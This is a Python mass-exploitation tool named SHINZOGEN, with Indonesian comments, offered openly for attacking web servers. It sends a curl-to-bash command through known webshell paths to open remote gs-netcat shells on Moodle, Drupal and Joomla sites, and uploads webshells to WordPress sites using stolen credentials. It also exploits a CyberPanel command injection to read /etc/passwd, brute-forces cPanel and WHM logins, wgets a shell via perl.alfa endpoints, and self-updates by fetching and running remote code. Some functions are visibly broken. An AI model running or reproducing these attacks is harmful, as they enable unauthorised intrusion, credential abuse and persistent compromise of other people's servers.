import requests
import re
import sys
import urllib3
import os
import random
import base64
import json
from tqdm import tqdm
from fake_useragent import UserAgent
from pystyle import Colors,Colorate,Write
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def gui():
    Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
    text = r"""
███████╗██╗  ██╗██╗███╗   ██╗███████╗ ██████╗  ██████╗ ███████╗███╗   ██╗
██╔════╝██║  ██║██║████╗  ██║     ██║██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
███████╗███████║██║██╔██╗ ██║███████║██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
╚════██║██╔══██║██║██║╚██╗██║██╔════╝██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
███████║██║  ██║██║██║ ╚████║███████╗╚██████╔╝╚██████╔╝███████╗██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═╝  ╚═══╝

# CREATED BY : t.me/shinzogen
# TOOLS NAME : SHINZOGEN
# LAST UPDATED : 15-06-2025
# TOOLS VERSION : V.2.1
# EXPLOIT TOOLS FOR 
    [1] RCE --> 2021 - 2025
    [2] MASS UPLOADER WORDPRESS --> 2023 - 2025
    [3] CYBERPANEL --> 2024 - 2025 (New Update!)
    [4] LOGIN CHECKER WP, CPANEL, WHM, FTP/SFTP
# SUPPORT 3 FORMAT LIST FOR WP MASS UPLOADER, CPANEL, WHM, FTP/SFTP :
    1. url#user@password ╗ 
    2. url|user|password
    3. url:user:password
# SAVE RESULT TO : FOLDER RESULTS
"""
    for N, line in enumerate(text.split("\n")):
        print(Colorate.Horizontal(Colors.red_to_green, line, 1))
        time.sleep(0.05)
    Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
# Warna Text
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
cyan = Fore.CYAN
yellow = Fore.YELLOW
mg = Fore.MAGENTA
white = Fore.WHITE
reset = Style.RESET_ALL

#Cek dan buat folder hasil
if not os.path.exists('results'):
    os.makedirs('results')

#Tulis teks jika gagal
def failed(url: str, msg: str):
    print(f"[{yellow}WP MASS UPLOADER{reset}] {url} --> [{red}{msg}{reset}]")

#Tulis teks jika berhasil
def vuln(url: str, msg: str):
    print(f"[{yellow}WP MASS UPLOADER{reset}] {url} --> [{green}{msg}{reset}]")

#Acak nama tema atau plugin wp
def random_name():
    let = "abcdefghijklmnopqrstuvwxyz1234567890"
    #theme_name = "themes.zip".split('.')[0]
    random_theme_name = ''.join(random.choice(let) for _ in range(8))
    return random_theme_name

#Penyatuan file txt
def gabung_file_txt(direktori, output_file='gabungan.txt', skip_files=None, hapus_asli=False):
    if skip_files is None:
        skip_files = {output_file}

    gabungan_path = os.path.join(direktori, output_file)

    with open(gabungan_path, 'w', encoding='utf-8') as outfile:
        for filename in os.listdir(direktori):
            if filename.endswith('.txt') and filename not in skip_files:
                file_path = os.path.join(direktori, filename)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as infile:
                    outfile.write(infile.read() + "\n")

                if hapus_asli:
                    os.remove(file_path)

#Pengkategorian baris domain
def filter_baris(baris_list, keyword):
    with open(baris_list, 'r').readlines():
        return [line.strip() for line in baris_list if keyword in line]

#Pembersihan baris domain
def extract_domain(baris_list):
    domain_set = set()
    for line in baris_list:
        match = re.search(r'(?:http[s]?://)?([\w.-]+)', line)
        if match:
            domain_set.add(match.group(1).strip())
    return sorted(domain_set)

def RCE(domain):
    paths = [
    "/local/moodle_webshell/webshell.php?action=exec&cmd=",
    "/modules/mod_webshell/mod_webshell.php?action=exec&cmd=",
    "/modules/drupal_rce/drupal_rce/shell.php?cmd=",
    "/blocks/rce/lang/en/block_rce.php?cmd=",
    "/moodle/blocks/rce/lang/en/block_rce.php?cmd=",
    "/moodle/local/moodle_webshell/webshell.php?action=exec&cmd=",
    "/aulavirtual/blocks/rce/lang/en/block_rce.php?cmd=",
    "/aulavirtual/local/moodle_webshell/webshell.php?action=exec&cmd=",
    "/campus/blocks/rce/lang/en/block_rce.php?cmd=",
    "/campus/local/moodle_webshell/webshell.php?action=exec&cmd=",
    "/cmd.php?cmd=",
    "/exec.php?exec=",
    "/modules/mod_webshell/mod_webshell.php?action=exec&cmd=",
    "/uploads/cmd.php?cmd=",
    "/wp-content/cmd.php?exec=",
    ]

    command = "bash -c \"$(curl -fsSL https://gsocket.io/y)\""
    for path in paths:
        for scheme in ['https', 'http']:
            url = f"{scheme}://{domain}{path}{command}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.YELLOW}[MENCOBA MENCARI SOCKET] {domain}{Style.RESET_ALL}")
                    cleaned_output = response.text.replace('\\"', '"').replace("\\'", "'")
                    match = re.search(r'gs-netcat -s ["\']([a-zA-Z0-9]+)["\'] -i', cleaned_output)
                    if match:
                        print(f"{Fore.GREEN}[+] BERHASIL MENDAPATKAN SOCKET DI {domain} SOCKET : {match.group(0)}{Style.RESET_ALL}")
                        with open("results/gs-netcat.txt", "a") as file:
                            file.write(f"{domain} || {match.group(0)}\n")
            except Exception as e:
                # print(f"Error: {e}")
                pass
class Login:
    def __init__(self, url, username: str = "", password: str = "", themes_zip: str = "Files/themes.zip", plugins_zip:str = "Files/plugin.zip") -> None:
        self.sessions = requests.Session()
        self.url = url
        self.username = username
        self.password = password
        self.themes_zip = themes_zip
        self.plugins_zip = plugins_zip
        self.cookies = {}
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Upgrade-Insecure-Requests": "1"
        }
        self.random_name = random_name()
        self.url_user_pwd = self.url+"/wp-login.php"+"#"+self.username+"@"+self.password

    def save_into_file(self, filename, content: str):
        with open(filename, "a+", encoding="utf8") as k:
            k.write(content+"\n")
        k.close()

    def check_files(self):
        if not os.path.exists(self.themes_zip) or not os.path.exists(self.plugins_zip):
            return False
        return True
    
    def get_nonce(self, type):
        if type == "plugin":
            path = "/wp-admin/plugin-install.php"
        elif type == "themes":
            path = "/wp-admin/theme-install.php?browse=popular"
        elif type == "upload":
            path = "/wp-admin/admin.php?page=wp_file_manager"
        else:
            path = "/wp-admin/plugin-install.php?s=file%2520manager&tab=search&type=term"
        try:
            getText = self.sessions.get(self.url+path, headers=self.headers, verify=False, timeout=10).text
            if type == "plugin" or type == "themes":

                extrack_nonce = re.search('id="_wpnonce" name="_wpnonce" value="(.*?)"', getText)
            elif type == "upload":
                getText = getText.replace('\/', '/')
                extrack_nonce = re.search('var fmfparams = {{"ajaxurl":"{}/wp-admin/admin-ajax.php","nonce":"(.*?)"'.format(self.url), getText)
            else:
                if "wp-file-manager/images/wp_file_manager.svg" in getText:
                    vuln(self.url_user_pwd, "Wp_File_Manager_Installed")
                    self.save_into_file("results/wpfilemanager.txt", self.url_user_pwd)
                    self.upload_shell()
                    return "found"
                extrack_nonce = re.search('var _wpUpdatesSettings = {"ajax_nonce":"(.*?)"};', getText)
            if extrack_nonce:
                nonce = extrack_nonce.group(1)
                return nonce
            else:
                failed(self.url, "Failed_get_nonce")
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except:
            failed(self.url, "Error_get_nonce")

    def get_cookies(self):
        try:
            getcookies = self.sessions.get(self.url, headers=self.headers, verify=False, timeout=10)
            self.cookies = dict(getcookies.cookies)
            return True
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
            return False
        except Exception as e:
            failed(self.url, "Error_get_cookies")
            return False

    def check_valid_login(self):
        url_dash = self.url.replace('wp-login.php', 'wp-admin')
        payload = {'log': f'{self.username}', 'pwd': f'{self.password}', 'wp-submit': 'Log+In', 'redirect_to': f'{url_dash}/', 'testcookie': '1'}
        t = 0
        while True:
            try:
                req = self.sessions.post(self.url, data=payload, headers=self.headers, verify=False, timeout=10, cookies=self.cookies)
                if 'dashboard' in req.text or '/wp-admin/admin-ajax.php' in req.text or "adminpage" in req.text or "/wp-admin/" in req.url:
                    vuln(self.url+"#"+self.username+"@"+self.password, "Valid_Login")
                    return True
                else:
                    failed(self.url+"#"+self.username+"@"+self.password, "Not_Valid_{}".format(t+1))
                    payload['redirect_to'] = url_dash
                    if t >= 1:
                        break
                    t += 1
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout"); return
            except Exception as e: 
                failed(self.url+"#"+self.username+"@"+self.password, "Error_when_try_login"); return

    # upload shell from wpfilemanager
    def upload_shell(self):
        shell_name = self.random_name + '.php'
        nonce = self.get_nonce('upload')
        SHELL = "Files/main.php"
        if nonce:
            data = {
                'reqid': '18efa290e4235f',
                'cmd': 'upload',
                'target': 'l1_Lw',
                'action': 'mk_file_folder_manager',
                '_wpnonce': nonce,
                'networkhref': '',
                'mtime[]': int(time.time())
            }
            files = {
                'upload[]': (shell_name, SHELL, 'application/x-php')
            }
            try:
            # check files 
                req = self.sessions.get(self.url+f'/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce={nonce}&networkhref=&cmd=ls&target=l1_Lw&intersect[]={shell_name}&reqid=18efa290e4235f', headers=self.headers).json()
                if req['list']:
                    data[f"hashes[{list(req['list'].keys())[0]}]"] = shell_name
                upload = self.sessions.post(self.url+'/wp-admin/admin-ajax.php', headers=self.headers, timeout=20, verify=False, data=data, files=files)
                upload_json = upload.json()
                if upload.status_code == 200 and upload_json['added']:
                    shell_path = ''
                    for text in upload_json['added']: 
                        shell_path = text['url']
                    if shell_path:
                        check_shell = requests.get(shell_path, headers=self.headers, timeout=10, verify=False).text
                        if "XXShells" in check_shell or "shell bypass 403" in check_shell or "403WebShell" in check_shell:
                            vuln(self.url_user_pwd, 'Upload_Shell')
                            self.save_into_file('shell.txt', shell_path)
                    else:
                        failed(self.url_user_pwd, 'Upload_Shell')
                else:
                    failed(self.url_user_pwd, 'Upload_Shell_Failed')
            except:
                failed(self.url_user_pwd, 'Upload_Shell_Error')

    def install_wpfilemanager(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "X-Requested-With": "XMLHttpRequest"
        }
        data = {
            "slug": "wp-file-manager",
            "action": "install-plugin",
            "_ajax_nonce": "",
            "_fs_nonce": "",
            "username": "",
            "password": "",
            "connection_type": "",
            "public_key": "",
            "private_key": ""
        }
        try:
            getNonce = self.get_nonce("wpfilemanager")
            if getNonce != "found" and getNonce:
                data['_ajax_nonce'] = getNonce
                installPlugin = self.sessions.post(self.url+"/wp-admin/admin-ajax.php", headers=headers, timeout=30, verify=False, data=data, cookies=self.cookies)
                if installPlugin.status_code == 200:
                    vuln(self.url_user_pwd, "Install_WpFileManager")
                    extract_activateurl = installPlugin.json()['data']['activateUrl']
                    activatePlugin = self.sessions.get(extract_activateurl, headers=self.headers, timeout=15)
                    if activatePlugin.status_code == 200 or "wp-file-manager/images/wp_file_manager.svg" in activatePlugin.text:     
                        vuln(self.url_user_pwd, "Activate_WpFileManager")
                        self.save_into_file("results/wpfilemanager.txt", self.url_user_pwd)
                        return True
                    else:
                        failed(self.url_user_pwd, "Activate_WpFileManager")
                else:
                    failed(self.url_user_pwd, "WpFileManager_Not_Installed")    
        except requests.exceptions.Timeout:
            failed(self.url, "Timeout")
        except Exception as e:
            # print(e)
            failed(self.url_user_pwd, "WpFileManager_Error")     

    def upload_themes(self):
        nonce = self.get_nonce("themes")
        if nonce:
            data = {'_wpnonce': nonce, '_wp_http_referer': '/wp-admin/theme-install.php', 'install-theme-submit': 'Installer'}
            files_up = {'themezip': ('{}.zip'.format(self.random_name), open(self.themes_zip, 'rb'), 'multipart/form-data')}
            try:
                upThemes = self.sessions.post(self.url+"/wp-admin/update.php?action=upload-theme", headers=self.headers, cookies=self.cookies, files=files_up, data=data, verify=False, timeout=20)
                if upThemes.status_code == 200:
                    vuln(self.url_user_pwd, "Upload_Themes")
                    self.save_into_file("success_upload_themes.txt", self.url_user_pwd)
                    url_shell = ['/wp-content/themes/{}/fooster1337.php', '/wp-content/themes/{}/uploader.php', '/wp-content/themes/{}/main.php']
                    found = False
                    for i in url_shell:
                        i = i.format(self.random_name)
                        try:
                            req = requests.get(self.url+i, headers=self.headers).text
                        except:
                            failed(self.url_user_pwd, "Error_check_shell")
                            break
                        if "AXV-Uploader" in req or "AXV-Shell" in req or "403WebShell" in req:
                            vuln(self.url+i, "Shell_uploaded")
                            self.save_into_file("results/wp-shells.txt", self.url+i)
                            found = True
                    if not found:
                        failed(self.url_user_pwd, "themes_Shell_Not_Uploaded")
                else:
                    failed(self.url_user_pwd, "themes_Failed")
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout")
            except Exception as e:
                # print(e)
                failed(self.url_user_pwd, "Error_upload_themes")

    def upload_plugins(self):
        nonce = self.get_nonce("plugin")
        if nonce:
            data = {'_wpnonce': nonce, '_wp_http_referer': '/wp-admin/plugin-install.php', 'install-plugin-submit': 'Install Now'}
            files_up = {'pluginzip': ('{}.zip'.format(self.random_name), open(self.plugins_zip, 'rb'), 'multipart/form-data')}
            try:
                upPlugin = self.sessions.post(self.url+"/wp-admin/update.php?action=upload-plugin", headers=self.headers, cookies=self.cookies, files=files_up, data=data, verify=False, timeout=20)
                if upPlugin.status_code == 200:
                    vuln(self.url_user_pwd, "Upload_Plugins")
                    self.save_into_file("success_upload_plugin.txt", self.url_user_pwd)
                    url_shell = ['/wp-content/plugins/{}/fooster1337.php', '/wp-content/plugins/{}/uploader.php', '/wp-content/plugins/{}/main.php']
                    found = False
                    for i in url_shell:
                        i = i.format(self.random_name)
                        try:
                            req = requests.get(self.url+i, headers=self.headers).text
                        except Exception as e:
                            failed(self.url_user_pwd, "Error_check_shell")
                            break
                        if '403WebShell' in req or 'AXV' in req:
                            vuln(self.url+i, "Shell_uploaded")
                            self.save_into_file("results/wp-shells.txt", self.url+i)
                            found = True
                    if not found:
                        failed(self.url_user_pwd, "Plugins_Shell_Not_Uploaded")
                else:
                    failed(self.url_user_pwd, "Plugins_Failed")
            except requests.exceptions.Timeout:
                failed(self.url, "Timeout")
            except:
                failed(self.url_user_pwd, "Error_upload_plugins")


    def start(self):
        if self.check_files() and self.get_cookies():
            if self.check_valid_login():
                self.url = self.url.replace("/wp-login.php", "")
                #check_wpfilemanager = self.get_nonce("wpfilemanager")
                if not self.upload_themes():
                    self.upload_plugins()
                if self.install_wpfilemanager():
                    self.upload_shell()

def fungsi1(domain): # |
    try:
        url = domain.split("|")[0]
        user = domain.split("|")[1].split("|")[0]
        pwd = domain.split("|", 2)[-1]
        return url, user, pwd
    except:pass
    
def fungsi2(domain): # #
    try:
        url = domain.split("#")[0]
        user = domain.split("#")[1].split("@")[0]
        pwd = domain.split("@", 2)[-1]
        return url, user, pwd
    except:pass
    
def fungsi3(domain): # :
    try:
        url = domain.split(":")[0]
        user = domain.split(":")[1].split(":")[0]
        pwd = domain.split(":", 2)[-1]
        return url, user, pwd
    except:pass

def start(target):
    themes_zip = "Files/themes.zip"
    plugins_zip = "Files/plugin.zip"
    try:
        if "wp-login.php|" in target or "wp-login.php/|" in target:
            url, user, pwd = fungsi1(target)
        if "wp-login.php#" in target or "wp-login.php#/" in target or "wp-login.php/#" in target:
            url, user, pwd = fungsi2(target)
        if "wp-login.php:" in target or "wp-login.php:/" in target or "wp-login.php/:" in target:
            url, user, pwd = fungsi3(target)

        if not url and not user and not pwd:
            failed(target, "Failed_Parsing")
        else:
            if themes_zip and plugins_zip:
                Login(url, username=user, password=pwd, themes_zip=themes_zip, plugins_zip=plugins_zip).start()
            else:
                Login(url, username=user, password=pwd).start()
    except Exception as e:print(e)

def exploit_perlalfa(domain):
    try:
        ua = {'User-Agent': UserAgent().random}
        b = base64.b64encode(bytes('wget https://raw.githubusercontent.com/shinzogen/blob/refs/heads/main/main.php', 'utf-8')) 
        base64_str = b.decode('utf-8') 
        payload = f"cmd={base64_str}"
        exploit = requests.post('https://' + domain, data=payload, headers=ua, timeout=30, verify=False)
        url = domain.split('/')[:-1]
        url = '/'.join(url)
        for scheme in ['https', 'http']:
            reqShell = requests.get(f'{scheme}://' + url + '/main.php', headers=ua, timeout=20, verify=False)
            if '403WebShell' in reqShell:
                print(f'{blue}[PERL ALFA] {white}{domain}{green} Exploited !')
                open('results/perl_alfa.txt', 'a+').write(f'{scheme}://{url}/main.php')
            else:print(f'{blue}[PERL ALFA] {white}{domain}{red} Failed !')
    except Exception as e:print(f"{red}Error: {e}")

def scan_perlalfa(domain):
    try:
        list = [
            "/alfacgiapi/perl.alfa",
            "/ALFA_DATA/alfacgiapi/perl.alfa",
            "/upload/ALFA_DATA/alfacgiapi/perl.alfa",
            "/wp-includes/js/jquery/ui/alfacgiapi/perl.alfa",
            "/wp-content/uploads/ALFA_DATA/alfacgiapi/perl.alfa",
            "/wp-includes/alfacgiapi/perl.alfa",
            "/wp-includes/images/media/ALFA_DATA/alfacgiapi/perl.alfa",
            "/uploads/pengumuman/alfacgiapi/perl.alfa",
            "/laravel/ALFA_DATA/alfacgiapi/perl.alfa",
            "/uploaded/alfacgiapi/perl.alfa",
            "/css/alfacgiapi/perl.alfa",
            "/wp-includes/assets/ALFA_DATA/alfacgiapi/perl.alfa",
            "/wp-plugins/alfacgiapi/perl.alfa",
            "/wp-content/plugins/alfacgiapi/perl.alfa",
            "/wp-content/plugins/wp-file-manager/alfacgiapi/perl.alfa",
            "/wp-admin/ALFA_DATA/alfacgiapi/perl.alfa",
            "/wp-content/plugins/dzs-zoomsounds/alfacgiapi/perl.alfa",
            "/img/ALFA_DATA/alfacgiapi/perl.alfa",
            "/home/alfacgiapi/perl.alfa",
            "/images/alfacgiapi/perl.alfa",
            "/wp-content/plugins/ALFA_DATA/alfacgiapi/perl.alfa",
            "/img/alfacgiapi/perl.alfa",
            "/wp-content/uploads/alfacgiapi/perl.alfa",
            "/assets/admin/ALFA_DATA/alfacgiapi/perl.alfa",
            "/assets/images/alfacgiapi/perl.alfa",
            "/assets/ALFA_DATA/alfacgiapi/perl.alfa",
            "/assets/files/ALFA_DATA/alfacgiapi/perl.alfa",
            "/assets/images/ALFA_DATA/alfacgiapi/perl.alfa",
            "/assets/cw/alfacgiapi/perl.alfa",
            "/wp-includes/pomo/alfacgiapi/perl.alfa"
        ]

        for path in list:
            ua = {'User-Agent': UserAgent().random}
            for scheme in ['https', 'http']:
                domain_perl = (f"{scheme}://{domain}{path}")
                req = requests.get(f'{domain}', headers=ua, timeout=10, verify=False)
                if req.status_code == 200 and req.text == "":
                    print(f'{blue}[PERL ALFA] {white}{scheme}://{domain}{path} {yellow}--> {green}ADA PERL.ALFA{reset}')
                    exploit_perlalfa(domain_perl)
                else:print(f'{blue}[PERL ALFA] {white}{scheme}://{domain}{path} {yellow}--> {red}TIDAK ADA PERL.ALFA{reset}')
    except:pass

def cyberpanel(domain):
    try:
        ua = {'User-Agent': UserAgent().random}
        domain = f"https://{domain}"
        if ':8090' in domain:
            domain = domain.replace(':8090', '')
        else:
            domain = domain
        resp = requests.get(f"{domain}:8090",headers=ua, timeout=7,verify=False)
        csrf = resp.cookies["csrftoken"]
        headers = {
                    "Content-Type": 'application/json',
                    "X-Csrftoken": csrf,
                    "Referer": domain + ':8090'
                }
        cookies = {
                    "csrftoken":csrf
                }
        payload = {
                    "statusfile":"; cat /etc/passwd"
                }

        ex1 = requests.put(f"{domain}:8090/dns/getresetstatus", headers=headers, cookies=cookies, data=json.dumps(payload), verify=False, timeout=20).text
        if "root:x:0:0:" in ex1 and "/usr/sbin" in ex1:
            open('RCE.txt', 'a+').write(f"https://{domain}\n")
            print(f"{blue}[CYBERPANEL] {white}{domain} {yellow}--> {white}[{green}Exploited!{white}]")
        else:
            ex2 = requests.put(f"{domain}:8090/ftp/getresetstatus", headers=headers, cookies=cookies, data=json.dumps(payload), verify=False, timeout=20).text
            if "root:x:0:0:" in ex2 and "/usr/sbin" in ex2:
                print(f"{blue}[CYBERPANEL] {white}{domain} {yellow}--> {white}[{green}Exploited!{white}]")
            else:print(f"{blue}[CYBERPANEL] {white}{domain} {yellow}--> {white}[{red}Not Vuln!{white}]")
    except:pass

def cpanel(target):
    if ":2083|" in target or ":2083/|" in target:
        url, user, pwd = fungsi1(target)
    if ":2083#" in target or ":2083#/" in target or ":2083/#" in target:
        url, user, pwd = fungsi2(target)
    if ":2083:" in target or ":2083:/" in target or ":2083/:" in target:
        url, user, pwd = fungsi3(target)

    if not url and not user and not pwd:
        failed(target, "Failed_Parsing")
        try:
            ua={'User-Agent': UserAgent().random}
            if ":" in domain:
                domain = domain.split(":")[0]
            elif '/' in domain[-1]:
                domain = domain.split("/")[0]
            else:pass
            cekCp = requests.get(f"https://{domain}:2083", headers=ua, timeout=7, verify=False).text
            if "<title>cPanel Login" in cekCp:
                    driver = webdriver.Chrome()
                    for _,usery in enumerate(user):
                        userx = usery.strip()
                        if '[DOMAIN]' in userx:
                            userz = userx.replace('[DOMAIN]', domain)
                        elif '[DOMAINAZ]' in userx:
                            userz = userx.replace('[DOMAINAZ]', domain).split('.')[1:-1]
                        else:
                            userz = userx

                        for _,passwb in enumerate(pwd):
                            passwf = passwb.strip()
                            if '[DOMAIN]' in passwf:
                                passw = passwf.replace('[DOMAIN]', domain)
                            else:
                                passw = passwf
                            driver.get(f"https://{domain}:2083")
                            try:
                                userxv = driver.find_element(By.ID, "user")
                                userxv.send_keys(userz)
                                
                                password = driver.find_element(By.ID, "pass")
                                password.send_keys(passw)
                                password.send_keys(Keys.RETURN)
                                sukses_login = requests.post(f'https://{domain}:2083/login/?login_only=1', headers=ua, data={'user':userz,'pass':passw,'goto_uri':'/'}, timeout=5, verify=True).text
                                if '"status":1' in sukses_login and '"security_token"' in sukses_login:
                                    print(f"{blue}[CPANEL BF]{white}https://{domain}|{userz}|{passw} | {green}SUKSES LOGIN !")
                                    with open(os.path.join('results/cpanel.txt'), "a+") as file:
                                        file.write(f'https://{domain}|{userz}|{passw}\n')
                                    driver.quit()
                                else:pass
                                driver.delete_all_cookies()
                            except:print(f"{blue}[CPANEL BF]{white}https://{domain} | {red}TIMEOUT !")
                            continue
                    
            else:print(f"{blue}[CPANEL BF]{white}https://{domain} | {red}BUKAN CPANEL LOGIN !")
        except:pass
    driver.quit()
    driver.delete_all_cookies()

def whm(target):
    if ":2087|" in target or ":2087/|" in target:
        url, user, pwd = fungsi1(target)
    if ":2087#" in target or ":2087#/" in target or ":2087/#" in target:
        url, user, pwd = fungsi2(target)
    if ":2087:" in target or ":2087:/" in target or ":2087/:" in target:
        url, user, pwd = fungsi3(target)

    if not url and not user and not pwd:
        failed(target, "Failed_Parsing")
        try:
            ua={'User-Agent': UserAgent().random}
            if ":" in domain:
                domain = domain.split(":")[0]
            elif '/' in domain[-1]:
                domain = domain.split("/")[0]
            else:pass
            cekCp = requests.get(f"https://{domain}:2087", headers=ua, timeout=7, verify=False).text
            if "<title>cPanel Login" in cekCp:
                    driver = webdriver.Chrome()
                    for _,usery in enumerate(user):
                        userx = usery.strip()
                        if '[DOMAIN]' in userx:
                            userz = userx.replace('[DOMAIN]', domain)
                        elif '[DOMAINAZ]' in userx:
                            userz = userx.replace('[DOMAINAZ]', domain).split('.')[1:-1]
                        else:
                            userz = userx

                        for _,passwb in enumerate(pwd):
                            passwf = passwb.strip()
                            if '[DOMAIN]' in passwf:
                                passw = passwf.replace('[DOMAIN]', domain)
                            else:
                                passw = passwf
                            driver.get(f"https://{domain}:2087")
                            try:
                                userxv = driver.find_element(By.ID, "user")
                                userxv.send_keys(userz)
                                
                                password = driver.find_element(By.ID, "pass")
                                password.send_keys(passw)
                                password.send_keys(Keys.RETURN)
                                sukses_login = requests.post(f'https://{domain}:2087/login/?login_only=1', headers=ua, data={'user':userz,'pass':passw,'goto_uri':'/'}, timeout=5, verify=True).text
                                if '"status":1' in sukses_login and '"security_token"' in sukses_login:
                                    print(f"{blue}[CPANEL BF]{white}https://{domain}|{userz}|{passw} | {green}SUKSES LOGIN !")
                                    with open(os.path.join('results/whm.txt'), "a+") as file:
                                        file.write(f'https://{domain}|{userz}|{passw}\n')
                                    driver.quit()
                                else:pass
                                driver.delete_all_cookies()
                            except:print(f"{blue}[CPANEL BF]{white}https://{domain} | {red}TIMEOUT !")
                            continue
                    
            else:print(f"{blue}[CPANEL BF]{white}https://{domain} | {red}BUKAN CPANEL LOGIN !")
        except:pass
    driver.quit()
    driver.delete_all_cookies()

LOCAL_VERSION = "2.2"
REMOTE_VERSION_URL = "https://raw.githubusercontent.com/shinzogen/blob/refs/heads/main/version.txt"
REMOTE_SCRIPT_URL = "https://raw.githubusercontent.com/shinzogen/blob/refs/heads/main/run.py"

def update_script(url, local_filename):
    try:
        r = requests.get(url, stream=True, timeout=30)
        total_size = int(r.headers.get('content-length', 0))
        block_size = 1024

        with open(local_filename, 'w', encoding='utf-8') as f_write, \
             tqdm(total=total_size, unit='B', unit_scale=True, desc='⬇️  Mengunduh', ncols=70) as progress:
            content = ''
            for chunk in r.iter_content(block_size):
                if chunk:
                    decoded = chunk.decode('utf-8', errors='ignore')
                    content += decoded
                    progress.update(len(chunk))
            f_write.write(content)

    except Exception as e:
        print(f"{red}[!] Gagal mengunduh script baru: {e}")
        sys.exit(1)

def check_update():
    try:
        r = requests.get(REMOTE_VERSION_URL, timeout=10)
        if r.status_code == 200:
            remote_version = r.text.strip()
            if remote_version != LOCAL_VERSION:
                print(f"\t{red}[!] VERSI TOOL SUDAH KADALUARSA / ADA UPDATE BARU!{reset}")
                print(f"\t{red} Versi Terbaru : {remote_version} | Versi Kamu : V{LOCAL_VERSION}{reset}")
                print(f"\t{red}[!] Silakan update dulu tool ini sebelum melanjutkan!{reset}")
                update_script(REMOTE_SCRIPT_URL, sys.argv[0])
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                print(f"\t{green}[CHECK] Kamu memakai versi terbaru : V{LOCAL_VERSION}{reset}")
        else:
            print(f"\t{red}[!] Tidak dapat cek versi update!{reset}")
            print(f"\t{yellow}Hubungi administrator atau owner t.me/shinzogen{reset}")
    except Exception as e:
        print(f"\t{red}[!] Gagal cek update: {e}\033[0m")
        sys.exit(1)

# Fungsi utama
def process_domain():
    print(f"\t{red}[{white}1{red}]{cyan} SEDANG MENGGABUNGKAN SEMUA FILE TXT ...{reset}")
    gabung_file_txt(direktori=".", hapus_asli=True)
    print (f"\t{red}[{white}2{red}]{cyan} SEDANG MEMFILTER SEMUA FILE TXT ...{reset}")
    semua_baris = 'gabungan.txt'
    hasil_filter = {
        "moodle": filter_baris(semua_baris, "/login/index.php"),
        "drupal": filter_baris(semua_baris, "/user/login"),
        "joomla": filter_baris(semua_baris, "/administrator"),
        "wordpress": filter_baris(semua_baris, "/wp-login"),
        "cyberpanel": filter_baris(semua_baris, ":8090"),
        "cpanel": filter_baris(semua_baris, ":2083"),
        "whm": filter_baris(semua_baris, ":2087"),
        "opensid": filter_baris(semua_baris, "/siteman"),
        "all": filter_baris(semua_baris, ".")
    }

    for nama, baris in hasil_filter.items():
        print(f"\t{red}[{white}3{red}]{cyan} MENGEKSTRAK FILE TXT ...{reset}")
        domain_bersih = set(extract_domain(baris))
        print(f"\t{red}[{white}{nama}{red}]{cyan} BERHASIL DI EKSTRAK! {white}({len(domain_bersih)} domain){reset}")

        if not domain_bersih:
            print(f"\t{red}[SKIP]{reset}{cyan} Tidak ada domain pada kategori {nama}{reset}")
            continue
    
        with ThreadPoolExecutor(max_workers=thr) as executor:
            if nama in ["moodle", "drupal", "joomla"]:
                print(f"\t{red}[{white}5{red}]{cyan} MENJALANKAN RCE EXPLOIT ...{reset}")
                executor.map(RCE, domain_bersih)
            elif nama == "wordpress":
                print(f"\t{red}[{white}6{red}]{cyan} MENJALANKAN WP MASS UPLOADER ...{reset}")
                executor.map(start, baris)
            elif nama == "all":
                print(f"\t{red}[{white}6{red}]{cyan} MENJALANKAN PERL ALFA SCAN DAN EXPLOIT ...{reset}")
                executor.map(scan_perlalfa, domain_bersih)
            elif nama == "cyberpanel":
                print(f"\t{red}[{white}6{red}]{cyan} MENJALANKAN CYBERPANEL EXPLOIT ...{reset}")
                executor.map(cyberpanel, domain_bersih)
            elif nama == "cpanel":
                print(f"\t{red}[{white}6{red}]{cyan} MENJALANKAN CPANEL BRUTE FORCE ...{reset}")
                executor.map(cpanel, baris)
            elif nama == "whm":
                print(f"\t{red}[{white}6{red}]{cyan} MENJALANKAN WHM BRUTE FORCE ...{reset}")
                executor.map(whm, baris)

if __name__ == "__main__":
    gui()
    check_update()
    thr = int(input(f"\t{red}[{white}#{red}]{cyan} MASUKKAN JUMLAH THREADS (KECEPATAN PROSES - MAX 100) : {reset}"))
    process_domain()
